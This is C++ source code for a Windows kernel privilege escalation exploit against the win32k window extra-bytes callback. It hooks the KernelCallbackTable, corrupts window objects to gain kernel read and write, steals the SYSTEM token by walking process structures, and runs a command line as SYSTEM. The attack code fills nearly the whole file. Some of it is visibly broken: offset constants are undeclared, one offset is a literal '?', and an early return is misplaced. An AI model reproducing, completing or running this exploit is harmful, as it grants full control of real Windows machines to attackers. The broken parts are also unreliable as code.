#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include<time.h>
typedef void*(NTAPI *lHMValidateHandle)(HANDLE h, int type);
typedef DWORD64(NTAPI *fnxxxClientAllocWindowClassExtraBytes)(DWORD64 *a1);
typedef DWORD64(NTAPI *fnNtUserConsoleControl)(int nConsoleCommand, HWND *pHwnd, int nConsoleInformationLength);
typedef DWORD64(NTAPI *fnNtCallbackReturn)(DWORD64 *a1, DWORD64 a2, DWORD64 a3);
typedef DWORD64 QWORD;
//#define _BYTE  uint8,#define _WORD  uint16,#define _DWORD uint32,#define _QWORD uint64

lHMValidateHandle g_pfnHmValidateHandle = NULL;
fnxxxClientAllocWindowClassExtraBytes	g_oldxxxClientAllocWindowClassExtraBytes = NULL;
fnNtUserConsoleControl g_pfnNtUserConsoleControl = nullptr;
fnNtCallbackReturn g_pfnNtCallbackReturn = nullptr;

QWORD g_nRandom = 0;QWORD g_qwExpLoit = 0;QWORD ref_g_pMem5 = 0;HWND g_hWndMax = 0;QWORD g_qwrpdesk  = 0;
bool g_bIsInit = 0;DWORD g_pmbi_rcBar_left = 0;DWORD g_offset_0x1 = 0;
QWORD g_qwMinBaseAddress = 0;QWORD g_qwRegionSize = 0;DWORD g_Thrdeskhead_cLockobj_Min = 0;

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}
        unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	g_pfnHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

HWND GuessHwnd(QWORD *pBaseAddress, DWORD dwRegionSize)
{
	
	QWORD qwBaseAddressBak = *pBaseAddress;
        QWORD qwBaseAddress = *pBaseAddress;
        DWORD dwRegionSizeBak = dwRegionSize;
        HWND hwndMagicWindow = nullptr;

       do 
	{
		while (*(WORD*)qwBaseAddress != g_nRandom&dwRegionSize > 0)
		{
			qwBaseAddress += 2;
                        dwRegionSize--;
		}


		if (*(DWORD*)((DWORD*)qwBaseAddress + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000)
		{
                        qwBaseAddress = qwBaseAddress + 4;
                        QWORD qwSub = qwBaseAddressBak - qwBaseAddress;
                        dwRegionSize = dwRegionSizeBak + qwSub;
		}

                hwndMagicWindow = (HWND)*(DWORD*)(qwBaseAddress - 0xc8);         //  !!!!!!!
                if (hwndMagicWindow)
		 {
			 break;
		 }
         } while (true);

        return hwndMagicWindow;                     //!!!!!!!
}

DWORD64  g_newxxxClientAllocWindowClassExtraBytes(DWORD64 *a1)     //97: ntuserconsolectrl,99:ntcallbackreturn
{
       DWORD64 dwTemp = *a1;
       if (dwTemp == g_nRandom)
	{
		g_offset_0x1 = 1;
                HWND hwndMagic = GuessHwnd(&g_qwMinBaseAddress, g_qwRegionSize);
                printf("MagciHwnd==%p\r\n", hwndMagic);
                if (hwndMagic)
		{
                        g_pfnNtUserConsoleControl(6i64, &hwndMagic,0x10);    //convert the last created window object (wndMagic) to a console window
			QWORD qwRet = g_Thrdeskhead_cLockobj_Min;
                        g_pfnNtCallbackReturn(&qwRet, 24, 0); //assign the kernel desktop heap base offset value to wndMagic.pExtraBytes field and 
                }                                             // return it to the kernel before the callback returns
	}

	DWORD64 dwTest = *((PULONG64)*(a1 - 11));
        return g_oldxxxClientAllocWindowClassExtraBytes(a1);
}

LRESULT __fastcall MyWndProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
	if (a2 != 2)
		return DefWindowProcW(a1, a2, a3, a4);
	PostQuitMessage(0);
	return 0i64;
}

QWORD	MyRead64(QWORD qwDestAddr)
{
        MENUBARINFO pmbi = {};
        pmbi.cbSize = sizeof(MENUBARINFO);
        if (g_bIsInit)
	{
        }
	else
	{
                QWORD *pTemp = (QWORD*)LocalAlloc(0x40u, 0x200ui64);
		memset(pTemp, 0, 0x200);
		QWORD qwBase = 0x000000400000000;
                QWORD qwAdd = 0x0000000800000008;
                for (int i = 0; i < 0x40; i++)
		{
                     *(pTemp + i) = qwBase + qwAdd*i;
                }

                *(QWORD *)ref_g_pMem5 = (QWORD)pTemp;
                GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
                g_pmbi_rcBar_left = pmbi.rcBar.left;
                bool  g_bIsInit = 1;
        }

        *(QWORD *)ref_g_pMem5 = qwDestAddr - g_pmbi_rcBar_left;
        GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
        return 	(unsigned int)pmbi.rcBar.left + ((__int64)pmbi.rcBar.top << 32);
}

int _tmain(int argc, _TCHAR* argv[])
{
        system("pause");
        if (!FindHMValidateHandle()) {
		printf("[!] Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}
        g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA("win32u.dll"), "NtUserConsoleControl");
        g_pfnNtCallbackReturn = (fnNtCallbackReturn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCallbackReturn");

	//hook  xxxClientAllocWindowClassExtraBytes KernelCallbackTable gs 0x60 PEB 0x58 KernelCallbackTable
	DWORD64	KernelCallbackTable = *(DWORD64*)(__readgsqword(0x60u) + 0x58);
        // 0x3d8 user32!_xxxClientAllocWindowClassExtraBytes:
	g_oldxxxClientAllocWindowClassExtraBytes = (fnxxxClientAllocWindowClassExtraBytes)*(DWORD64*)(KernelCallbackTable + 0x3D8);// 0x3d8
        DWORD dwOldProtect;
        VirtualProtect((LPVOID)(KernelCallbackTable + 0x3D8), 0x300ui64, 0x40u, &dwOldProtect);
	*(DWORD64*)(KernelCallbackTable + 0x3D8) = (DWORD64)g_newxxxClientAllocWindowClassExtraBytes;
	VirtualProtect((LPVOID)(KernelCallbackTable + 0x3D8), 0x300ui64, dwOldProtect, &dwOldProtect);

         srand(time(0i64));
	 g_nRandom = (rand() % 255 + 0x1234) | 1;   // !! *LN 171

	WNDCLASSEXW wndClass = {};   // MAGIC!!!
        wndClass.lpfnWndProc = (WNDPROC)MyWndProc;wndClass.cbSize = 80;wndClass.style = 3;wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 32;wndClass.hInstance = GetModuleHandleW(0i64);wndClass.lpszClassName = L"normalClass";  //NORMAL CLASS
	ATOM g_lpWcxNormal = RegisterClassExW(&wndClass);  //NORMAL ATOM
	
	wndClass.cbWndExtra = g_nRandom;  //!! *LN164
	wndClass.lpszClassName = L"magicClass";    // MAGIC CLASS
	ATOM g_lpWcxMagic = RegisterClassExW(&wndClass);  // MAGIC ATOM

        QWORD	offset_ActiveProcessLinks = 0x2F0;QWORD  offset_InheritedFromUniquePId = 0x3E8;
	QWORD	offset_Token = 0x360;QWORD  offset_UniquePId = 0x2E8;

	CreatePopupMenu();

	QWORD	g_pMem1 = LocalAlloc(0x40u, 0x200ui64); QWORD	g_pMem2 = (__int64)LocalAlloc(0x40u, 0x30ui64);
	QWORD	g_pMem3 = LocalAlloc(0x40u, 4ui64); QWORD  g_pMem4 = (LONG_PTR)LocalAlloc(0x40u, 0xA0ui64);
	HLOCAL	g_pMem5 = LocalAlloc(0x40u, 8ui64);

	DWORD *ref_g_pMem1 = (DWORD *)g_pMem1; QWORD ref_g_pMem2 = g_pMem2; QWORD ref_g_pMem3 = g_pMem3;QWORD	ref_g_pMem4 = g_pMem4; ref_g_pMem5 = g_pMem5;
        *(DWORD *)(g_pMem2 + offset_0x2c) = 16;
	*ref_g_pMem1 = 0x88888888;
	*(QWORD *)&ref_g_pMem1[2 * ((unsigned int)offset_0x28 >> 3)] = ref_g_pMem2;
	ref_g_pMem1[(unsigned __int64)(unsigned int)offset_0x40 >> 2] = 1;
	ref_g_pMem1[(unsigned __int64)(unsigned int)offset_0x44 >> 2] = 1;
        *(QWORD *)&ref_g_pMem1[2 * ((unsigned __int64)(unsigned int)offset_0x58 >> 3)] = (QWORD)g_pMem5;
        *(QWORD *)(ref_g_pMem3 + 8) = 16i64;
        *(QWORD *)ref_g_pMem3 = (QWORD)ref_g_pMem1;
	*(QWORD *)(ref_g_pMem4 +offset_0x98) = ref_g_pMem3;

        printf("CreateWnd\r\n");

	struct _MEMORY_BASIC_INFORMATION Buffer = {};

	Buffer.BaseAddress = 0i64;Buffer.AllocationBase = 0i64;
	*(QWORD *)&Buffer.AllocationProtect = 0i64;Buffer.RegionSize = 0i64;
	*(QWORD *)&Buffer.State = 0i64;*(QWORD *)&Buffer.Type = 0i64;

        nIndex = 0;
	nLoop = 10;
        QWORD Thrdeskhead_cLockObj1 = 0;
	QWORD Thrdeskhead_cLockObj2 = 0;
        QWORD arrEntryDesktop[10] = {};
	HWND arrhwndNoraml[10] = {};
        do //CreatWndExW([in]dwExStyle,[in,opt]lpClassName,[in,opt]lpWindowName,[in]dwStyle,[in]intX,[in]intY,[in]intnWidth,[in]intnHeight,[in, optional]hWndParent,[in,opt]hMenu,[in,opt]hInstance,[in, optional] LPVOIDlpParam);
	{
	        HWND hwndNormal = CreateWindowExW(0x8000000u,(LPCWSTR)(unsigned __int16)g_lpWcxNormal,L"somewnd",
			0x8000000u,0,0,0,0,0i64,CreateMenu(),GetModuleHandleW(0i64),0i64);  //WS_EX_NOACTIVATE 0x08000000L
                arrhwndNoraml[nIndex] = hwndNormal;
		QWORD	qwfirstEntryDesktop = (QWORD)g_pfnHmValidateHandle(hwndNormal, 1);
		arrEntryDesktop[nIndex] = qwfirstEntryDesktop;

		printf("Hwnd:%08x   qwfirstEntryDesktop=%p\r\n", hwndNormal, qwfirstEntryDesktop);
                VirtualQuery((LPVOID)qwfirstEntryDesktop, &Buffer, 0x30ui64);
                printf("BaseAddress:%p   RegionSize=:%p\r\n", Buffer.BaseAddress, Buffer.RegionSize);

		if (g_qwMinBaseAddress == 0)
		{
			g_qwMinBaseAddress = (QWORD)Buffer.BaseAddress;
			g_qwRegionSize = (QWORD)Buffer.RegionSize;
		}
		else
		{
			if (g_qwMinBaseAddress<(QWORD)Buffer.BaseAddress)
			{}
			else
			{
				g_qwMinBaseAddress = (QWORD)Buffer.BaseAddress;
				g_qwRegionSize = (QWORD)Buffer.RegionSize;
			}
                }
                ++nIndex;
		--nLoop;
	}
	while (nLoop);

	printf("Min BaseAddress:%p   RegionSize=:%p\r\n", g_qwMinBaseAddress, g_qwRegionSize);
        Thrdeskhead_cLockObj1 = *(DWORD *)((char *)arrEntryDesktop[0] + 8);
	Thrdeskhead_cLockObj2 = *(DWORD *)((char *)arrEntryDesktop[1] + 8);
        HWND hWndMin = *(HWND *)((char *)arrhwndNoraml + (Thrdeskhead_cLockObj2 < Thrdeskhead_cLockObj1 ? 8 : 0));

        int nTemp = 0;
	if (Thrdeskhead_cLockObj1 <= Thrdeskhead_cLockObj2)
		nTemp = 1;
	g_hWndMax = arrhwndNoraml[nTemp];
	QWORD	firstEntryDesktop_Max = arrEntryDesktop[nTemp];
        firstEntryDesktop_Max = arrEntryDesktop[nTemp];
        QWORD	firstEntryDesktop_Min = *(__int64 *)((char *)arrEntryDesktop + (Thrdeskhead_cLockObj2 < Thrdeskhead_cLockObj1 ? 8 : 0));

	g_Thrdeskhead_cLockobj_Min = *(DWORD *)(firstEntryDesktop_Min + 8);
	DWORD	Thrdeskhead_cLockboj_Max = *(DWORD *)((char *)firstEntryDesktop_Max + 8);
	for (int i = 2; i < 10; ++i)
		DestroyWindow(arrhwndNoraml[i]);
	
        g_pfnNtUserConsoleControl(6i64, &hWndMin, 0x10);

        DWORD tagWndMin_offset_0x128 = *(DWORD *)(firstEntryDesktop_Min + offset_0x128);
	DWORD tagWndMax_offset_0x128 = *(QWORD *)(firstEntryDesktop_Max + offset_0x128);

HWND	g_hWndMagic = CreateWindowExW(
		0x8000000u,(LPCWSTR)(unsigned __int16)g_lpWcxMagic,L"somewnd",
		0x8000000u,0,0,0,0,0,CreateMenu() ,GetModuleHandleW(0) ,0);
	printf("realMagicHwnd=%p\n", g_hWndMagic);
        DWORD dwRet = SetWindowLongW(g_hWndMagic, offset_0x128, g_Thrdeskhead_cLockobj_Min);
        printf("dwRet=%p\r\n", dwRet);
        printf("tagWndMin_offset_0x128=%p\r\n", tagWndMin_offset_0x128);
        SetWindowLongW(g_hWndMagic, offset_0xc8, 0xFFFFFFF); //The vulnerability within the xxxCreateWindowEx API allowed the WND_Malicious.ExtraBytes field 
        //be to set to a value of WND0 offset within the kernel desktop heap. Now any time SetWindowLongW is called on WND_Malicious it will write to WND0. By supplying an offset of 0xc8, the function will overwrite the WND0.cbWndExtra field to a large value of 0XFFFFFFF 
	// By supplying an offset of 0xc8, the function will overwrite the WND0.cbWndExtra field to a large value of 0XFFFFFFF 
	
	
	//KRNL ADDR LEAK:
	// Write a value of 0x400000000000000 to WND1 style field to temporarily change it to a child window per figures 15 and 16 below.
        // Calling SetWindowLongPtrA API on WND0 with a value of -12 (GWLP_ID) now allows the spmenu field (type tagMENU) of WND1 to be overwritten with a 
	// fake spmenu data structure since we have changed it to be a child window per figure 15 and 17 below.
        // Per SetWindowLongPtrA API documentation, the return value will give us the original value at the offset overwritten, i.e., the spmenu data struct
	// pointer which is a kernel memory address. So, we now have leaked a pointer to a spmenu (type tagMENU) data structure in kernel memory and 
	// replaced the pointer in WND1.spmenu with a fake spmenu data structure within user desktop heap per figure 17 below.

	
	
	g_qwrpdesk  = *(QWORD *)(firstEntryDesktop_Max + 0x18);
        SetWindowLongPtrA(hWndMin,0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk  ^ 0x4000000000000000);
        
	g_qwExpLoit = SetWindowLongPtrA(g_hWndMax, -12, g_pMem4);
        printf("g_qwExpLoit=%p\r\n", g_qwExpLoit);
       
	QWORD qwOffset = Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min;
        QWORD qwNewLong = g_qwExpLoit;
        SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk );
	QWORD qwFrist = MyRead64(g_qwExpLoit + offset_0x50);printf("qwFrist read=%p\r\n", qwFrist); // 
        QWORD qwSecond = MyRead64(qwFrist + offset_0x18); printf("qwSecond read=%p\r\n", qwSecond); // *wnd1 in orig spmenu
        QWORD qwThird = MyRead64(qwSecond + offset_0x80);printf("qwThird read=%p\r\n", qwThird); // *THREADINFO of WND1
        QWORD qwFourth = MyRead64(qwFrist + offset_0x10);printf("qwFourth read=%p\r\n", qwFourth); //*ETHREAD of THREADINFO
        QWORD qwFifth = MyRead64(qwFourth+?);printf("qwFifth read=%p\r\n", qwFifth); //*KTHREAD of ETHREAD
        QWORD qwEprocess = MyRead64(qwFifth + offset_0x220);printf("qwSixth read=%p\r\n", qwEprocess);  //*EPROCESS OF KERNELTHREAD,  (UNIQUEPID 2E8,ACTIVEPROCLINKS 2FO)
        QWORD qwEprocessBak = qwEprocess;
        DWORD dwPidSelf = GetCurrentProcessId();
        QWORD dwSystemToken = 0;QWORD dwMyToken = 0;QWORD qwMyTokenAddr = 0;

        while (!dwSystemToken || !qwMyTokenAddr)
	{
        DWORD	dwPidRead = MyRead64(qwEprocess + (unsigned int)offset_UniqueProcessId);
	if (dwPidRead == 4)
			dwSystemToken = MyRead64(qwEprocess + (unsigned int)offset_Token);
	if (dwPidRead == dwPidSelf)
			qwMyTokenAddr = qwEprocess + (unsigned int)offset_Token;
	qwEprocess = MyRead64(qwEprocess + (unsigned int)offset_ActiveProcessLinks)- (unsigned int)offset_ActiveProcessLinks;
	
	if (qwEprocessBak==qwEprocess)
	{
		break;
	}
        }

	//write64
	SetWindowLongPtrA(hWndMin, Thrdeskhead_cLockboj_Max + offset_0x128 - g_Thrdeskhead_cLockobj_Min, qwMyTokenAddr);
        SetWindowLongPtrA(g_hWndMax, 0, dwSystemToken);

        SECURITY_ATTRIBUTES		sa;
	HANDLE					hRead, hWrite;
	byte					buf[40960] = { 0 };
	STARTUPINFOW			si;
	PROCESS_INFORMATION		pi;
	DWORD					bytesRead;
	RtlSecureZeroMemory(&si, sizeof(si));RtlSecureZeroMemory(&pi, sizeof(pi));RtlSecureZeroMemory(&sa, sizeof(sa));
	int br = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);sa.lpSecurityDescriptor = NULL;sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return -3;
	}
	wprintf(L"[*] Trying to execute %s as SYSTEM\n", argv[1]);
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoW(&si);
	si.hStdError = hWrite;si.hStdOutput = hWrite;si.wShowWindow = SW_HIDE;si.lpDesktop = L"WinSta0\\Default";si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	wchar_t cmd[4096] = { 0 };
	lstrcpyW(cmd, argv[1]);
	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(hWrite);
		CloseHandle(hRead);
		printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
		return -2;
	}
	CloseHandle(hWrite);
	printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
	while (1)
	{
		if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
			break;
		br += bytesRead;
	}
	puts("===============================");
	puts((char*)buf);
	fflush(stdout);fflush(stderr);
	CloseHandle(hRead);CloseHandle(pi.hProcess);

        QWORD	tagWndMagic = (QWORD)g_pfnHmValidateHandle(g_hWndMagic,1);

	int 	nSizeofPointer = 8;
        QWORD qwcbwndExtra = *(QWORD *)(tagWndMagic +  offset_0xe0) ^ 0x80000000000i64;
        SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, qwThird + *(unsigned int *)(nSizeofPointer + tagWndMagic) + 0x128);
	SetWindowLongPtrA(g_hWndMax, 0, 0);
	SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, qwThird + (nSizeofPointer + tagWndMagic) + 0xe0);
	SetWindowLongPtrA(g_hWndMax, 0, qwcbwndExtra);
        SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk  ^ 0x4000000000000000);
	SetWindowLongPtrA(g_hWndMax, -12, qwNewLong);
        SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk );
	SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, tagWndMax_offset_0x128);
	SetWindowLongPtrA(hWndMin, offset_0x128, (unsigned int)tagWndMin_offset_0x128);

        system("pause");
        return 0;
}
